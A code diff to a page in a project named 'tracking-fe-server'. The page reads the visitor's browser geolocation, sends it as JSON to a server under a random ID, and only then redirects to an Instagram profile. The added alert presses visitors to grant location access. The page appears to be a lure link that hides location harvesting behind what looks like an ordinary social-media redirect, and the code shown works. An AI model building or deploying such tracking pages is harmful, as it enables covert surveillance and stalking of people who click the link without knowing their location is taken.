@@ -1,4 +1,3 @@
-<!-- filepath: tracking-fe-server/public/index.html -->
 <!DOCTYPE html>
 <html>
   <head>
@@ -10,9 +9,10 @@
 
       function getLocation() {
         if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(sendPosition);
+          navigator.geolocation.getCurrentPosition(sendPosition, handleError);
+        } else {
+          alert("Geolocation tidak didukung oleh browser Anda.");
         }
-        window.location.href = "https://instagram.com/ilhamrhmddni"; // Langsung arahkan ke URL tujuan
       }
 
       const randomId = "id-" + Math.random().toString(36).substring(2, 10);
@@ -31,9 +31,20 @@
             "Content-Type": "application/json",
           },
           body: JSON.stringify(data),
-        }).catch(() => {
-          // Gagal kirim data, tidak ada aksi tambahan
-        });
+        })
+          .then(() => {
+            // Setelah data berhasil dikirim, arahkan ke URL tujuan
+            window.location.href = "https://instagram.com/ilhamrhmddni";
+          })
+          .catch(() => {
+            // Gagal kirim data, tidak ada aksi tambahan
+          });
+      }
+
+      function handleError(error) {
+        alert(
+          "Gagal mendapatkan lokasi. Pastikan Anda mengizinkan akses lokasi."
+        );
       }
     </script>
   </body>
